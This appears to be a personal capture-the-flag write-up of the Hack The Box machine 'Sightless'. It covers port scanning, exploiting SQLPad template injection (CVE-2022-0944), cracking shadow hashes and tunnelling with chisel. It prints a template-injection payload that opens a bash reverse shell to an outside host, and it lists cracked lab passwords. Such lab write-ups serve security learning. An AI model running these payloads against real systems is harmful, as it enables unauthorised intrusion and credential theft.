Aight, let's try this one...

### Starting with `nmap`
- Results give the following results:
```a
Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-14 20:04 EDT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:05 (0:00:12 remaining)
Nmap scan report for 10.10.11.32
Host is up (0.024s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=9/14%Time=66E624A5%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Ser
SF:ver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20try
SF:\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20b
SF:eing\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.75 seconds

```
- So we have the following services:
	- `ftp`
		- Unknown version
	- `ssh`
		- OpenSSH 8.9p1 (clean)
	- `http`
		- Nginx 1.18.0 (looks clean as well)
- So far, the `ftp` server is setting off alarm bells. I might need to enumerate that futher.

### The website
- So this is a fancy website. I see lots of fancy stuff going on up in here.
- It's a single page site, so I don't think I'll be doing any sort of injection.
- I don't see anywhere that I can actually put stuff to be malicious. I'll try to enumerate the site, but I don't think I'll get much of anything.
	- `ffuf -c -w ~/Nerd/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u "http://sightless.htb/" -t 200`
- I see absolutely nothing interesting on this site. Tried to get some directories, got back absolutely zilch. Unfortunate.
- Wait wait wait! The SQLPad page. This could have something interesting! Sandbox escalation? 
- I see from this page that there is an `admin` user as well as a user named `john`.
	- I shall try to login to the `ftp` server with these usernames...

### Looking closer at `ftp`
- I know for a fact that the `ssh` server can't be vulnerable (unless I can brute force, but I doubt it).
- If I can get a better look at the ftp version I might be able to do something for real.
- Potential upload of some `php` exploit to the site? Seems too easy, but possible.
- Let's try to grab a banner with `netcat`.
	- `nc 10.10.11.32 21`
	- No results.
- Let's see if `metasploit` has a scanner.
	- We can use the version scanner available to us, so that's neat.
	- Didn't get a numeric version, but at least we now know that we're working with `ProFTPD`.
	- I see some potential exploits I could attempt. I don't see why not. Later, though.
- Let's just try to connect to the thing. What's the worst that could happen?
	- `ftp -p 10.10.11.32`
	- So it's pretty slow, but we can try to get in.
	- Anonymous login was a bust.
	- Same with credentials seen in the SQLPad thing.
- Trying the couple things on `metasploit`...
	- Nothing.
- Alright, it seems like brute force might be a good option for this. The thingy wasn't even asking for a password, so just username might be all that we need.

### SQLPad
- So apparently this is an actual separate service that could have vulnerabilities! (found from a hint)
- A bit of recon within the page shows that this is version 6.10.0. Let's see what it is vulnerable to...
	- I smell RCE... CVE-2022-0944 effects versions < 6.10.1!
	- There does appear to be another exploit, CVE-2022-0944, which is "template injection". Seems less promising, but whatever.
- CVE-2022-0944
	- Let's run this bad boy!
	- And it doesn't work. The API call that it's trying to exploit doesn't seem to be anywhere. Unfortunate.
	- I'll try the other one.
- CVE-2022-0944
	- I would appear to need a username and password for this. I don't have access to credentials, so that might be a little challenging.
	- Upon further research, the above is only if you are required to have credentials to run a template. I am allowed to run a template without them.
	- Let's go ahead and get this done. Might as well do it manually, too.
		- Payload format: `{{ process.mainModule.require('child_process').exec('id>/tmp/pwn') }}`
		- Pretty epic, let's just figure out a better thing to execute and then we're gonna be getting down and dirty with it.
	- So we need to set up a MySQL environment and provide our payload in the Database form field. Easy.
	- So this isn't too difficult. Let's start by getting our payload ready to go: `{{ process.mainModule.require('child_process').exec('bash -i >& /dev/tcp/10.10.14.164/4444 0>&1') }}`
	- That's nice and easy. Let's try it!
	- Several hours later. I know I'm doing the right thing, but I don't understand why it isn't working. Sucks to suck, I guess.
	- Alright, I figured it out. I had to try a different proof of concept approach where you inject from the name field rather than the database field. Ridiculous and horrible.
- So we're "in"!

### FIRST EVER FOOTHOLD!
- Very nice, I understand how I got here. I think I would have gotten pretty far with it as well if I had just checked that one extra link.
- So we're pretty good for now. There's a bit of a spoiler for the next steps (I know I'm in a docker container), but that's fine. I'm going to treat myself to an ice cream now.
- So here's what I know about the machine I'm in:
	- I'm root
	- There's a Michael user
	- It's running Debian Buster
	- I can see the shadow file!
- Alright, let's see if we can crack some hashes...
	- We can!
	- `unshadow passwdFile shadowFile > unshadowed`
	- `john --wordlist=/path/to/rockyou.txt unshadowed`
	- So here's our passwords: 
	```a
	root: blindside
	michael: insaneclownposse
	```
	- Pretty legit. We can try to use these for more things later. 
- Something interesting, I see a directory called `docker-entrypoint` in the root directory. I'm not actually in the machine. I'm in a docker container on the machine. Heck.
- Well, as it would turn out people like to reuse their credentials. Michael on the docker container is also an ssh user on the host machine. He even uses the same weak password. Hacker.

### Priv-esc
- So now it's just a matter of finding the user-flag and then escalating privs. 
- Unfortunately, the root user does not have a recycled password. That would have been funny, though.
- Interestingly enough, as Michael I don't have access to John's stuff. Weird. 
- Also would have been funny, but Michael is not a sudoer. I would imagine that John is.
- We're running Ubuntu Jammy, I don't think there's anything inherently wrong with that.
- I can't output contents of the shadow file. That's normal.
- I think that I might be able to get a file written to the webserver, then run it. If I can write and have it execute as root then I'm golden.
- I don't have write permissions in `/var/www`. Good idea, though.
- Run a quick `uname -a`, and... what do we have here?
	- Looks like we have something of a priv esc exploit on our hands. Why, running kernel version 5.15.0? How scandalous! It looks as if you're vulnerable to a dirty pipe!
	- Let's load our exploit onto the machine and run it!
	- Didn't work, apparently I'm chasing my tail here.
- So I consulted the hint resource, and it looks like we should investigate the newfound port 8080.

# Everything past this point fully uses a guide. I am not well-learned enough for this. I did a lot on my own, though!

### Froxlor 
- So we have another resource running...
- We're going to forward this service with a tool called chisel.
	- Install on host machine
	- Use `wget` to grab the binary from the GitHub on the box.
	- Host: `chisel server -p 9999 --reverse`
	- Box: `chisel client [MY MACHINE] R:[PORT]:127.0.0.1:[PORT]`
- That was fun and definitely not really stupid to get working.
- The main point is that I have access to the application on my host machine now.
- So I see a login page. I tried out Michael's credentials, but I don't think that horse can get beat any more to death.
- So we either need to figure out valid creds or just exploit as it is right now. Cool.
- I see an RCE exploit, so that might be cool.
- Getting in requires a cool exploit that I need to explain.
- Never got system.